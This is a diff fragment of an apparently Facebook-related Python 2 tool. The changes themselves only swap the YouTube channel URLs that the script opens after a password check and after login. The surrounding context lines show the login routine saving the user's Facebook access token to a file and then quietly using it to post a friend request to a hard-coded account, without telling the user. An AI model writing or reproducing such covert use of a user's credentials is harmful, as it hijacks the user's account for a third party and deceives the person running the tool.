@@ -105,10 +105,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;97mACCESS DENIED"
-            os.system('xdg-open https://m.youtube.com/channel/TechnicalMasterAli')
+            os.system('xdg-open https://m.youtube.com/c/TechnicalMasterAli')
     else:
         print "\033[1;97mACCESS DENIED"
-        os.system('xdg-open https://m.youtube.com/channel/TechnicalMasterAli')
+        os.system('xdg-open https://m.youtube.com/c/TechnicalMasterAli')
 def login():
 	os.system('clear')
 	try:
@@ -153,7 +153,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;97mSuccessfully Logged In'
-				os.system('xdg-open https://m.youtube.com/channel/UCQdBT_TMMD3l6CrS6JxiUSQ')
+				os.system('xdg-open https://m.youtube.com/c/TechnicalMasterAli')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
